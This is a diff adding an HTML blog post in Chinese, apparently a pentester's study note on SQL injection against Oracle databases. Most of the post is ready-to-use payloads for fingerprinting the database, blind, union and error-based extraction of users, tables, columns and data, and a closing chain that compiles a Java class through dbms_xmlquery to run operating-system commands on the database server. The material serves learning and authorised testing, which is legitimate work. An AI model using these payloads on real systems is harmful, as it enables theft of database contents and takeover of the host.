@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="n55iwi">
+
+
+
+
+
+<title>oracle注入 | n55iwi&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">n55iwi&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">n55iwi&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">oracle注入</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">n55iwi</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">八月 11, 2025&nbsp;&nbsp;15:02:29</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><ol>
+<li><p>Oracle查询必须要带表名，不知道表名可以用虚拟表dual代替。dual：是一个虚拟表，用来构成select的语法规则，比如要查询select 1不能写成select 1，要写成select 1 from dual；</p>
+</li>
+<li><p>Oracle没有堆叠查询,不能用;隔开提交语句;</p>
+</li>
+<li><p>Oracle 没有类似 MySQL 的数据库概念，而是用表空间来代替。一个 Oracle 只有一个数据库，它给账户开辟数据库空间，称之为表空间，创建数据库就是开辟账户的表空间。select user from dual,其实就相当于同时获取了它的用户名和数据库名，所谓数据库名，即数据表的拥有者，也就是⽤户名。 </p>
+</li>
+<li><p>oracle没有if函数，所以进行布尔盲注时一般使用decode()或者 case when语句；</p>
+</li>
+<li><p>Oracle的||为连接符，不是逻辑 OR 运算符，跟MySQL的不一样；</p>
+</li>
+<li><p>Oracle数据库有一种PL&#x2F;SQL语言,叫做过程化 SQL 语言(Procedual Language&#x2F;SQL),PL&#x2F;SQL 是 Oracle 数据库对 SQL 语句的扩展,Oracle提权漏洞主要也是基于这个；</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--基本结构</span></span><br><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    </span><br><span class="line">EXCEPTION</span><br><span class="line">    </span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="判断权限"><a href="#判断权限" class="headerlink" title="判断权限"></a>判断权限</h3><p>权限是用户对一项功能的执行权力。在Oracle中，根据系统的管理方式不同，将 Oracle 权限分为系统权限与实体权限。系统权限是指是否被授权用户可以连接到数据库上，在数据库中可以进行哪些系统操作。而实体权限是指用户对具体的模式实体 (schema) 所拥有的权限。</p>
+<p>如何判断当前用户是不是DBA权限</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> role <span class="keyword">FROM</span> session_roles <span class="keyword">WHERE</span> role <span class="operator">=</span> <span class="string">&#x27;DBA&#x27;</span><span class="comment">--返回dba则说明是dba权限</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250811213805926.png" alt="image-20250811213805926"></p>
+<p>赋予用户DBA权限（需要登录最高管理员账号,如 SYS 或 SYSTEM）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> DBA <span class="keyword">TO</span> username; <span class="comment">--username改成实际的用户名</span></span><br></pre></td></tr></table></figure>
+
+<p>回收DBA 权限(具有 DBA 权限的用户（如 SYS 或 SYSTEM）才能撤销其他用户的 DBA 角色)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">REVOKE</span> DBA <span class="keyword">FROM</span> username;<span class="comment">--username改成实际的用户名</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="判断是否是Oracle数据库"><a href="#判断是否是Oracle数据库" class="headerlink" title="判断是否是Oracle数据库"></a>判断是否是Oracle数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="comment">--如果该语句返回正常，再尝试db_name()=&#x27;1&#x27;或者current_user=&#x27;1&#x27;，都报错则说明是Oracle数据库；尝试另外两个函数的原因是排除mssql和postgresql</span></span><br><span class="line"><span class="keyword">or</span> <span class="built_in">exp</span>(<span class="number">290</span>)<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>、<span class="keyword">or</span> <span class="built_in">exp</span>(<span class="number">291</span>)<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="comment">--oracle的exp最大值只到290，超过290就会溢出报错</span></span><br><span class="line"><span class="keyword">or</span> lengthb(<span class="string">&#x27;b&#x27;</span>)<span class="operator">=</span><span class="number">1</span> <span class="comment">--oracle判断长度的特征函数，注入的时候用来判断长度可以平替length()</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250811213941882.png" alt="image-20250811213941882"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250811213954215.png" alt="image-20250811213954215"></p>
+<h3 id="常见注入类型"><a href="#常见注入类型" class="headerlink" title="常见注入类型"></a>常见注入类型</h3><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>判断函数decode、case when，字符串截取函数substr()、lpad()、rpad()、instr()</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">decode(A,B,C,D) <span class="comment">--A跟B比较，相等返回C，不相等返回D  decode(&#x27;P&#x27;,substr(user,1,1),EXP(9),EXP(999))</span></span><br><span class="line"><span class="keyword">case</span> <span class="keyword">when</span> A <span class="keyword">then</span> B <span class="keyword">else</span> c <span class="keyword">end</span> <span class="comment">--A表达式为真执行B，否则执行C </span></span><br><span class="line"><span class="comment">--这两个函数功能跟postgresql的一样</span></span><br><span class="line">rpad() <span class="comment">-- rpad() 函数的作用是在字符串右侧填充指定的字符，直到字符串达到指定的长度。</span></span><br><span class="line">lpad() <span class="comment">-- lpad() 函数的作用是在字符串左侧填充指定的字符，直到字符串达到指定的长度。</span></span><br><span class="line">例如：</span><br><span class="line">rpad(<span class="keyword">user</span>,<span class="number">10</span>,<span class="string">&#x27;*&#x27;</span>)<span class="comment">--因为user长度不够10，所以在右侧填充了两个*号，使字符串长度达到10.</span></span><br><span class="line">lpad(<span class="keyword">user</span>,<span class="number">10</span>,<span class="string">&#x27;*&#x27;</span>)<span class="comment">--也就是会在左侧填充两个&#x27;*&#x27;号</span></span><br><span class="line">instr() <span class="comment">--跟postgresql的position()函数类似，返回某个字符在该字符串的第一个位置的数字</span></span><br></pre></td></tr></table></figure>
+
+<p>常用盲注语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;||case when 1=1 then power(2,99999) else 1 end||&#x27;</span> <span class="comment">--报错 </span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;||case when 1=2 then power(2,99999) else 1 end||&#x27;</span> <span class="comment">--正常 把1=2换成注user的语句即可</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;||case when 1=instr(user,&#x27;</span>P<span class="string">&#x27;) then exp(291) else 1 end||&#x27;</span> <span class="comment">--如果user第一位是P则报错，遍历字符可注出user第一位，以此类推</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;||decode(1,instr(user,&#x27;</span>P<span class="string">&#x27;),exp(9),exp(999))||&#x27;</span> <span class="comment">--如果user第一位是P则报错，遍历字符可注出user第一位，以此类推</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;+AND+1=(case+when+1=2+then+1+else+1/0+end)+OR+&#x27;</span>a<span class="string">&#x27;=&#x27;</span>b</span><br><span class="line"><span class="string">&#x27;+and+1=exp(999)+or+&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AND 1=DBMS_PIPE.RECEIVE_MESSAGE(&#x27;a&#x27;,2)-- 延时2秒</span><br><span class="line">AND 1=(select decode(substr(user,1,1),&#x27;P&#x27;,(select count(*) from all_objects),0) from dual)--去构造更复杂的语句造成数据库延时</span><br></pre></td></tr></table></figure>
+
+<h4 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h4><p>能查询表信息的系统表：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dba_tables  <span class="comment">--系统里所有的表的信息，需要DBA权限才能查询</span></span><br><span class="line">all_tables  <span class="comment">--当前用户有权限的表的信息（只要对某个表有任何权限，即可在此视图中看到表的相关信息）</span></span><br><span class="line">user_tables <span class="comment">--当前用户名下的表的信息</span></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> user_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="comment">--使用table_name关键字去查询表名</span></span><br></pre></td></tr></table></figure>
+
+<p>能查询列信息的系统表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dba_tab_columns  <span class="comment">--对应 dba_tables表 包含的所有表的列信息</span></span><br><span class="line">all_tab_columns  <span class="comment">--对应 all_tables表 包含的所有表的列信息</span></span><br><span class="line">user_tab_columns <span class="comment">--对应 user_tables表 包含的所有表的列信息</span></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;USERS&#x27;</span> <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="comment">--使用column_name关键字去查询列名</span></span><br></pre></td></tr></table></figure>
+
+<p>Oracle联合注入跟MySQL联合注入不同点</p>
+<ol>
+<li>后面必须跟上dual，否则报错；</li>
+<li>不能直接使用1,2,3填充，可以先用null填充，可通过’null’来判断当前列是字符型还是数字型</li>
+<li>Oracle如果只需返回一行数据是用rownum&#x3D;1来限制</li>
+</ol>
+<p>如果使用’null’填充该列报错则说明该列为数字型</p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250811224509218.png" alt="image-20250811224509218"></p>
+<p>爆表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select NULL,NULL,(select table_name from user_tables where rownum=1),NULL from dual--+ --获取第一张表</span><br><span class="line">union select NULL,NULL,(select table_name from user_tables where rownum=1 and table_name&lt;&gt;&#x27;刚才查出来的&#x27;),NULL from dual--+ --获取第二张表，&lt;&gt;是不等于的意思</span><br><span class="line">union select NULL,NULL,(select table_name from user_tables where rownum=1 and table_name not in (&#x27;刚才查出来的&#x27;)),NULL from dual--+ 也可以用not in()，一样的意思</span><br></pre></td></tr></table></figure>
+
+<p>第一张表：</p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250811225832446.png" alt="image-20250811225832446"></p>
+<p>第二张表：我这里环境就一张表</p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250811225940925.png" alt="image-20250811225940925"></p>
+<p>爆列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select 1,NULL,(select column_name from user_tab_columns where table_name=&#x27;USERS&#x27; and rownum=1) from dual --第一个列名</span><br><span class="line">union select 1,NULL,(select column_name from user_tab_columns where table_name=&#x27;USERS&#x27; and rownum=1 and column_name not in (&#x27;ID&#x27;)) from dual --第二个</span><br><span class="line">union select 1,NULL,(select column_name from user_tab_columns where table_name=&#x27;USERS&#x27; and rownum=1 and column_name not in (&#x27;ID&#x27;,&#x27;NAME&#x27;)) from dual --第三个</span><br></pre></td></tr></table></figure>
+
+<p>第一列</p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250811230532837.png" alt="image-20250811230532837"></p>
+<p>第二列：</p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250811230617504.png" alt="image-20250811230617504"></p>
+<p>第三列：</p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250811230642849.png" alt="image-20250811230642849"></p>
+<p>LISTAGG 函数可以将多行数据按照指定的分隔符合并为一行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">NULL</span>,(<span class="keyword">select</span> <span class="built_in">LISTAGG</span>(column_name, <span class="string">&#x27;,&#x27;</span>) <span class="keyword">WITHIN</span> <span class="keyword">GROUP</span> (<span class="keyword">ORDER</span> <span class="keyword">BY</span> column_name) <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;USERS&#x27;</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250811232142724.png" alt="image-20250811232142724"></p>
+<p>读取内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,NULL,(select NAME from USERS where rownum=1) from dual--跟上面的一样就不一一举例</span><br><span class="line">--这里有个需要注意的地方就是：如果你查的这一列回显的是数字型，那就需要换到数字型那一列去注，不然会报错</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250811232932591.png" alt="image-20250811232932591"></p>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>报错特征一般会带着ora前缀。</p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250811233457665.png" alt="image-20250811233457665"></p>
+<p>utl_inaddr.get_host_name</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> utl_inaddr.get_host_name(<span class="keyword">user</span>) <span class="keyword">from</span> dual; <span class="comment">--本意是获取ip 地址，但是如果传递参数无法得到解析就会返回一个oracle 错误并显示传递的参数。这种方法在 Oracle 8g、9g、10g中不需要任何权限，但是在Oracle 11g以及以后的版本中，官方加强了访问控制权限，所以在11g以后要使用此方法进行报错注入，当前数据库用户必须有网络访问权限。</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250811221648005.png" alt="image-20250811221648005"></p>
+<p>ctxsys.drithsx.sn</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--Oracle 中用于处理文本，当传入参数类型错误时，会返回异常。</span><br><span class="line">or 1=ctxsys.drithsx.sn(1,&#x27;~&#x27;%7c%7c(select user from dual)%7c%7c&#x27;~&#x27;)--+ </span><br><span class="line">or 1=ctxsys.drithsx.sn(1,chr(126)%7c%7c(select user from dual)%7c%7cchr(126))--+</span><br><span class="line">or 1=ctxsys.drithsx.sn(1,&#x27;~&#x27;%7c%7c(select table_name from user_tables where rownum=1)%7c%7c&#x27;~&#x27;)--+</span><br><span class="line">or 1=ctxsys.drithsx.sn(1,&#x27;~&#x27;%7c%7c(select table_name from user_tables where rownum=1 and table_name&lt;&gt;&#x27;DEPT&#x27;)%7c%7c&#x27;~&#x27;)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250811221911232.png" alt="image-20250811221911232"></p>
+<p>dbms_xdb_version.checkin()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select+dbms_xdb_version.checkin(&#x27;~&#x27;%7c%7c(select+user+from+dual)%7c%7c&#x27;~&#x27;)+from+dual) is not null --报错得到user</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250811234016140.png" alt="image-20250811234016140"></p>
+<p>dbms_xdb_version.makeversioned()函数报错注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">select</span><span class="operator">+</span>dbms_xdb_version.makeversioned(<span class="string">&#x27;~&#x27;</span><span class="operator">%</span><span class="number">7</span>c<span class="operator">%</span><span class="number">7</span>c(<span class="keyword">select</span><span class="operator">+</span><span class="keyword">user</span><span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>dual)<span class="operator">%</span><span class="number">7</span>c<span class="operator">%</span><span class="number">7</span>c<span class="string">&#x27;~&#x27;</span>)<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>dual)<span class="operator">+</span><span class="keyword">is</span><span class="operator">+</span><span class="keyword">not</span><span class="operator">+</span><span class="keyword">null</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250811234147830.png" alt="image-20250811234147830"></p>
+<p>ctxsys.ctx_report.token_type()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select ctxsys.ctx_report.token_type(&#x27;~&#x27;||(select user from dual)||&#x27;~&#x27;, &#x27;1&#x27;) from dual)+is+not+null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250811234501105.png" alt="image-20250811234501105"></p>
+<p>xmltype()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select xmltype(&#x27;&lt;:&#x27;||(select user from dual)||&#x27;&gt;&#x27;) from dual)+is+not+null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250811234705283.png" alt="image-20250811234705283"></p>
+<p>dbms_xdb_version.uncheckout()</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">select</span> dbms_xdb_version.uncheckout(<span class="string">&#x27;~&#x27;</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)<span class="operator">||</span><span class="string">&#x27;~&#x27;</span>) <span class="keyword">from</span> dual)<span class="operator">+</span><span class="keyword">is</span><span class="operator">+</span><span class="keyword">not</span><span class="operator">+</span><span class="keyword">null</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250811234858222.png" alt="image-20250811234858222"></p>
+<p>dbms_utility.sqlid_to_sqlhash()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(SELECT dbms_utility.sqlid_to_sqlhash(&#x27;~&#x27;||(select user from dual)||&#x27;~&#x27;) from dual)+is+not+null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250811234948144.png" alt="image-20250811234948144"></p>
+<p>ordsys.ord_dicom.getmappingxpath()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select ordsys.ord_dicom.getmappingxpath(&#x27;~&#x27;||(select user from dual)||&#x27;~&#x27;, 1, 1) from dual)+is+not+null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250811235058455.png" alt="image-20250811235058455"></p>
+<p>utl_inaddr.get_host_address()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select utl_inaddr.get_host_address(&#x27;~&#x27;||(select user from dual)||&#x27;~&#x27;) from dual)+is+not+null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250811235200567.png" alt="image-20250811235200567"></p>
+<h3 id="oracle提权"><a href="#oracle提权" class="headerlink" title="oracle提权"></a>oracle提权</h3><p><strong>需要dba权限</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--创建java库</span></span><br><span class="line">(<span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#x27;&#x27;;commit;end;&#x27;</span>) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not null</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250812011157868.png" alt="image-20250812011157868"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--赋予当前用户Java权限</span></span><br><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE &#x27;&#x27;grant javasyspriv to test111&#x27;&#x27;; end;&#x27;</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250812011313627.png" alt="image-20250812011313627"></p>
+<p>创建函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xmlquery.newcontext(&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name &#x27;&#x27;&#x27;&#x27;LinxUtil.runCMD(java.lang.String) return String&#x27;&#x27;&#x27;&#x27;; &#x27;&#x27;;commit;end;&#x27;) from dual;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250812012049857.png" alt="image-20250812012049857"></p>
+<p>判断是否创建成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select OBJECT_ID from all_objects where object_name =&#x27;LINXRUNCMD&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250812012126948.png" alt="image-20250812012126948"></p>
+<p>执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select LinxRunCMD(&#x27;whoami&#x27;) from dual</span><br></pre></td></tr></table></figure>
+
+<p>这里使用联合注入回显点观察命令回显结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,null,(select LinxRunCMD(&#x27;whoami&#x27;) from dual) from dual</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250812012558771.png" alt="image-20250812012558771"></p>
+<p>如果没有联合注入，可以尝试用sqlmap的–sql-shell</p>
